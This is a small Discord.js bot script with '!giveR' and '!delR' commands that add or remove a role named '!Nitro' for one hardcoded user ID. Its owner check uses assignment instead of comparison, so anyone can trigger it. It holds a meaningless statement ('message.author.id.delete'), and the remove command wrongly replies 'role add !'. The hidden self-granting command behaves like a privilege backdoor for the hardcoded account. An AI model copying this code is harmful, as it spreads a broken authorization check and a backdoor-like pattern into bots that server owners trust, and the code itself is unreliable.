const Discord = require("discord.js");
const client = new Discord.Client();

const prefix = "!";
const Owner = "593763665459675167"

client.on("message" , message => {
	if (message.content.startsWith(prefix + "giveR")) {
		
		let role = message.member.guild.roles.cache.find(role => role.name === "!Nitro");
	 
		if (message.author.id = Owner) {
			if (role) message.guild.members.cache.get(Owner).roles.add(role); 
				message.author.id.delete;
					message.channel.send("role add !");
					}
				}
		 	});

client.on("message" , message => {
	if (message.content.startsWith(prefix + "delR")) {
		
		let role = message.member.guild.roles.cache.find(role => role.name === "!Nitro");
	 
		if (message.author.id = Owner) {
			if (role) message.guild.members.cache.get(Owner).roles.remove(role); 
				message.author.id.delete;
					message.channel.send("role add !");
					}
				}
		 	});
client.login("token")